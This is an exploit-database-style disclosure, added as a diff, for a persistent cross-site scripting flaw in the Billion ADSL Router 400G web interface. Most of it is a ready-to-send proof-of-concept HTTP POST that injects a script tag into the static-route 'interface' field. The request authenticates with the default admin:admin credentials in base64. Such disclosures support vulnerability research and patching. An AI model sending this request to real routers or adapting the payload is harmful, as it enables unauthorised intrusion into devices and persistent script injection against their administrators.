@@ -1,0 +1,30 @@
+# Exploit Title: Billion ADSL Router 400G 20151105641 - Cross-Site Scripting
+# Author: Cakes
+# Discovery Date: 2018-09-30
+# Vendor Homepage: http://www.billion.com
+# Software Link: http://billionfirmware.co.za
+# Tested Version: 20151105641
+# Tested on OS: Kali Linux
+# CVE: N/A
+
+# Description:
+# Improper input validation on the  router web interface allows attackers add a persistent 
+# Cross-Site scripting attack on the IP Interface field when adding a new static route. 
+# Simply intercept a new static route request and add in the XSS
+
+# Poc
+
+POST /configuration/edit-list.html HTTP/1.1
+Host: Target
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: http://Target/configuration/edit-list.html
+Authorization: Basic YWRtaW46YWRtaW4=
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 93
+
+nodename=&destination=0.0.0.0&netmask=0.0.0.0&gateway=0.0.0.1&interface=<script>alert("Cakes");</script>&cost=1&action=create
